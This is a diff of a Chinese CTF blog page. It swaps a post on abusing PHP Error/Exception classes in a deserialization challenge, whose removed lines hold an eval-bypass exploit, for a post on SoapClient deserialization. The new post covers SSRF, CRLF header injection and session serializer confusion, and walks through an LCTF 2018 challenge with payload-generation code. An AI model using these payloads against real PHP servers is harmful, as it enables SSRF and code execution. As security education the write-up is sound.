@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="php错误类的利用, Keep-Boom">
+    <meta name="keywords" content="php-Soap类的利用, Keep-Boom">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>php错误类的利用 | Keep-Boom</title>
+    <title>php-Soap类的利用 | Keep-Boom</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">php错误类的利用</h1>
+                    <h1 class="description center-align post-title">php-Soap类的利用</h1>
                 </div>
             </div>
         </div>
@@ -443,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-07-29
+                    2021-08-08
                 </div>
                 
 
@@ -459,60 +459,141 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h5 id="PHP原生类中的两个类"><a href="#PHP原生类中的两个类" class="headerlink" title="PHP原生类中的两个类"></a>PHP原生类中的两个类</h5><p><strong>Error</strong></p>
-<p>(PHP 7, PHP 8)</p>
-<p>是所有PHP内部错误类的基类。</p>
-<p><strong>Exception</strong></p>
-<p>(PHP 5, PHP 7, PHP 8)</p>
-<p>是所有异常的基类。</p>
-<p>二者都存在<code>__toString</code>方法。当类被当作字符串处理的时候就会触发该方法。</p>
-<p>看看被当成字符串时会输出啥？</p>
-<p><img src="D:\boke\blog\source\images\124.png"></p>
-<p>发现会以字符串的形式输出当前报错，包含当前的错误信息（payload）以及当前报错的行号（2），而传入 Error(“payload”,1) 中的错误代码“1”则没有输出出来。</p>
-<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p>source</p>
-<pre><code> &lt;?php
-error_reporting(0);
-class SYCLOVER &#123;
-    public $syc;
-    public $lover;
-
-    public function __wakeup()&#123;
-        if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123;
-           if(!preg_match(&quot;/\&lt;\?php|\(|\)|\&quot;|\&#39;/&quot;, $this-&gt;syc, $match))&#123;
-               eval($this-&gt;syc);
-           &#125; else &#123;
-               die(&quot;Try Hard !!&quot;);
-           &#125;
-
+                <h5 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h5><ul>
+<li>1利用PHP原生类<code>SoapClient</code>来构造POP链</li>
+<li><code>call_user_func</code>函数的特性</li>
+<li><code>session</code>存储机制，php序列化引擎</li>
+<li>CRLF Injection漏洞</li>
+<li>SSRF原理</li>
+</ul>
+<h5 id="①反序列化之PHP原生类SoapClient的利用"><a href="#①反序列化之PHP原生类SoapClient的利用" class="headerlink" title="①反序列化之PHP原生类SoapClient的利用"></a>①反序列化之PHP原生类<code>SoapClient</code>的利用</h5><p>参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0">https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label1_0</a></p>
+<ul>
+<li>查找原生类所带的方法</li>
+</ul>
+<pre><code>&lt;?php
+$classes = get_declared_classes();
+foreach ($classes as $class) &#123;
+    $methods = get_class_methods($class);
+    foreach ($methods as $method) &#123;
+        if (in_array($method, array(
+            &#39;__destruct&#39;,
+            &#39;__toString&#39;,
+            &#39;__wakeup&#39;,
+            &#39;__call&#39;,
+            &#39;__callStatic&#39;,
+            &#39;__get&#39;,
+            &#39;__set&#39;,
+            &#39;__isset&#39;,
+            &#39;__unset&#39;,
+            &#39;__invoke&#39;,
+            &#39;__set_state&#39;
+        ))) &#123;
+            print $class . &#39;::&#39; . $method . &quot;\n&quot;;
         &#125;
     &#125;
-&#125;
-
-if (isset($_GET[&#39;great&#39;]))&#123;
-    unserialize($_GET[&#39;great&#39;]);
-&#125; else &#123;
-    highlight_file(__FILE__);
-&#125;
-
-?&gt;</code></pre>
+&#125; </code></pre>
+<p>注：需要先安装<code>php_soap</code>才会有<code>SoapClient</code>这个原生类。(phpstudy直接点击,php拓展安装就行)</p>
 <ul>
-<li>第一眼看到<code>md5</code>和<code>sha1</code>会想到利用数组绕过，但是数组在eval中却是执行不了的。</li>
-<li>因为<code>Error(&quot;payload&quot;,1)</code>和<code>Error(&quot;payload&quot;,2)</code>本身是不一样的但作为字符串的时候输出是一样的。所以可以利用<code>Error</code>和<code>Exception</code>类进行绕过。</li>
-<li>过滤了<code>&#39;</code>，<code>&quot;</code>，<code>()</code>这里可以利用取反来进行绕过。</li>
+<li><code>SoapClient</code>类中存在<code>__call</code>方法，被触发时<strong>可以也只能</strong>发送<code>http</code>和<code>https</code>请求。</li>
 </ul>
-<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code>&lt;?php
-class SYCLOVER &#123;
-    public $syc;
-    public $lover;
+<pre><code>public SoapClient :: SoapClient （mixed $wsdl [，array $options ]）</code></pre>
+<p>第一个参数是用来指明是否是wsdl模式。</p>
+<p>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</p>
+<ul>
+<li>利用<code>SoapClient</code>进行<code>SSRF</code>，而且这里<code>http</code>头部还存在<code>CRLF</code>漏洞(<strong><u>因为User-Agent可控</u></strong>)</li>
+</ul>
+<pre><code>&lt;?php
+$target = &quot;http://example.com:5555/&quot;;
+$post_string = &#39;data=abc&#39;;
+$headers = array(
+    &#39;X-Forwarded-For: 127.0.0.1&#39;,
+    &#39;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#39;
+);
+$b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,&#39;user_agent&#39;=&gt;&#39;wupco^^Content-Type: application/x-www-form-urlencoded^^&#39;.join(&#39;^^&#39;,$headers).&#39;^^Content-Length: &#39;. (string)strlen($post_string).&#39;^^^^&#39;.$post_string,&#39;uri&#39;=&gt;&#39;hello&#39;));
+$aaa = serialize($b);
+$aaa = str_replace(&#39;^^&#39;,&quot;\n\r&quot;,$aaa);
+echo urlencode($aaa);</code></pre>
+<p><img src="/images/2.jpg"></p>
+<h5 id="②call-user-func特性"><a href="#②call-user-func特性" class="headerlink" title="②call_user_func特性"></a>②call_user_func特性</h5><p>当第一个参数为数组时，会把第一个值当作类名，第二个值当作方法进行回调。</p>
+<pre><code>&lt;?php
+class fun&#123;
+    static function say_hello()&#123;
+        echo &quot;hello!&quot;;
+    &#125;
 &#125;
-$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;
-$a=new Error($str,1);
-$b=new Error($str,2);
-$c = new SYCLOVER();
-$c-&gt;syc = $a;
-$c-&gt;lover = $b;
-echo(urlencode(serialize($c)));
+$class = new fun();
+call_user_func(array($class,&#39;say_hello&#39;));
+
+=&gt; hello!</code></pre>
+<h5 id="③session存储机制，php序列化引擎"><a href="#③session存储机制，php序列化引擎" class="headerlink" title="③session存储机制，php序列化引擎"></a>③<code>session</code>存储机制，php序列化引擎</h5><p>参考文章：<a target="_blank" rel="noopener" href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">https://blog.spoock.com/2016/10/16/php-serialize-problem/</a></p>
+<ul>
+<li>在php.ini中存在三项配置项：</li>
+</ul>
+<pre><code>session.save_path=&quot;&quot;   --设置session的存储路径
+session.save_handler=&quot;&quot; --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)
+session.auto_start   boolen --指定会话模块是否在请求开始时启动一个会话,默认为0不启动
+session.serialize_handler   string --定义用来序列化/反序列化的处理器名字。默认使用php</code></pre>
+<ul>
+<li><p>serizlize_handler有三种方式</p>
+<p>php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</p>
+<p>php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</p>
+<p>php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值</p>
+</li>
+<li><p>PHP Session中的序列化危害</p>
+</li>
+</ul>
+<p>PHP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。<br>如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确第反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。例如:</p>
+<pre><code>$_SESSION[&#39;ryat&#39;] = &#39;|O:11:&quot;PeopleClass&quot;:0:&#123;&#125;&#39;;</code></pre>
+<p>上述的$_SESSION的数据使用<code>php_serialize</code>，那么最后的存储的内容就是<code>a:1:&#123;s:6:&quot;spoock&quot;;s:24:&quot;|O:11:&quot;PeopleClass&quot;:0:&#123;&#125;&quot;;&#125;</code>。<br>但是我们在进行读取的时候，选择的是<code>php</code>，那么最后读取的内容是:</p>
+<pre><code>array (size=1)
+  &#39;a:1:&#123;s:6:&quot;spoock&quot;;s:24:&quot;&#39; =&gt; 
+    object(__PHP_Incomplete_Class)[1]
+      public &#39;__PHP_Incomplete_Class_Name&#39; =&gt; string &#39;PeopleClass&#39; (length=11)</code></pre>
+<p>这是因为当使用php引擎的时候，php引擎会以**|**作为作为key和value的分隔符，那么就会将<code>a:1:&#123;s:6:&quot;spoock&quot;;s:24:&quot;</code>作为SESSION的key，将<code>O:11:&quot;PeopleClass&quot;:0:&#123;&#125;</code>作为value，然后进行反序列化，最后就会得到PeopleClas这个类。</p>
+<h5 id="④CRLF-Injection漏洞"><a href="#④CRLF-Injection漏洞" class="headerlink" title="④CRLF Injection漏洞"></a>④CRLF Injection漏洞</h5><p>参考文章:<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/d4c304dbd0af">https://www.jianshu.com/p/d4c304dbd0af</a></p>
+<p><code>CRLF</code>是”回车+换行”（\r\n）的简称。在HTTP协议中，<code>HTTPHeader</code>与<code>HTTPBody</code>是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以<code>CRLFInjection</code>又叫<code>HTTPResponseSplitting</code>，简称HRS。<br>简单来说<br>http请求遇到两个<code>\r\n</code>即<code>%0d%0a</code>，会将前半部分当做头部解析，而将剩下的部分当做体，<u>*<strong>当我们可以控制User-Agent的值时，头部可</strong></u>控*，就可以注入CRLF实现修改http请求包。</p>
+<h5 id="⑤实例利用"><a href="#⑤实例利用" class="headerlink" title="⑤实例利用"></a>⑤实例利用</h5><ul>
+<li>source</li>
+</ul>
+<pre><code>index.php
+
+&lt;?php
+highlight_file(__FILE__);
+$b = &#39;implode&#39;;
+call_user_func($_GET[&#39;f&#39;], $_POST);
+session_start();
+if (isset($_GET[&#39;name&#39;])) &#123;
+    $_SESSION[&#39;name&#39;] = $_GET[&#39;name&#39;];
+&#125;
+var_dump($_SESSION);
+$a = array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);
+call_user_func($b, $a);
 ?&gt;</code></pre>
+<pre><code>flag.php访问回显
+
+only localhost can get flag!session_start(); echo &#39;only localhost can get flag!&#39;; $flag = &#39;LCTF&#123;*************************&#125;&#39;; if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123; $_SESSION[&#39;flag&#39;] = $flag; &#125; only localhost can get flag! </code></pre>
+<ul>
+<li>思路</li>
+</ul>
+<p>1.利用回调函数覆盖session序列化引擎为<code>php_serilaze</code>(默认引擎是<code>php</code>)</p>
+<p>2.构造SSRF的Soap类的序列化字符串配合序列化注入写入session文件</p>
+<p>3.然后利用变量覆盖漏洞，覆盖掉变量b为回调函数<code>call_user_func</code>,此时<code>call_user_func($b, $a)</code>=&gt;<code>call_user_func(call_user_func, array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;))</code>，调用Soap类中不存在的方法触发<code>__call</code>方法进行<code>SSRF</code>,访问flag.php将flag写入session中。</p>
+<p>4.最后再把session打印出来</p>
+<p><strong>生成payload</strong></p>
+<pre><code>&lt;?php
+$target = &quot;http://127.0.0.1/flag.php&quot;;
+$attack = new SoapClient(null,array(&#39;location&#39; =&gt; $target,
+    &#39;user_agent&#39; =&gt; &quot;N0rth3ty\r\nCookie: PHPSESSID=g6ooseaeo905j0q4b9qqn2n471\r\n&quot;,
+    &#39;uri&#39; =&gt; &quot;123&quot;));
+$payload = urlencode(serialize($attack));
+echo $payload;
+?&gt;</code></pre>
+<p><img src="/images/125.png"></p>
+<p>覆盖变量b触发Soap类中<code>__call</code>方法</p>
+<p><img src="/images/126.png"></p>
+<p>最后带上PHPSESSID凭证打印出session内容就行。</p>
+<p><img src="/images/127.png"></p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1376384">https://cloud.tencent.com/developer/article/1376384</a></p>
 
             </div>
             <hr/>
@@ -538,7 +619,7 @@ echo(urlencode(serialize($c)));
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/07/29/php%E9%94%99%E8%AF%AF%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/">http://example.com/2021/07/29/php%E9%94%99%E8%AF%AF%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/</a>
+                    <a href="http://example.com/2021/08/08/php-Soap%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/">http://example.com/2021/08/08/php-Soap%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -743,9 +824,10 @@ echo(urlencode(serialize($c)));
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/08/08/php-Soap%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/">
                     <div class="card-image">
@@ -763,9 +845,9 @@ echo(urlencode(serialize($c)));
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-08-08
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-08
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -774,6 +856,7 @@ echo(urlencode(serialize($c)));
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -784,13 +867,13 @@ echo(urlencode(serialize($c)));
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/07/26/ECB%E5%8A%A0%E5%AF%86/">
+                <a href="/2021/07/29/php%E9%94%99%E8%AF%AF%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="ECB加密">
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="php错误类的利用">
                         
-                        <span class="card-title">ECB加密</span>
+                        <span class="card-title">php错误类的利用</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -801,7 +884,7 @@ echo(urlencode(serialize($c)));
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-26
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-29
                             </span>
                         <span class="publish-author">
                             
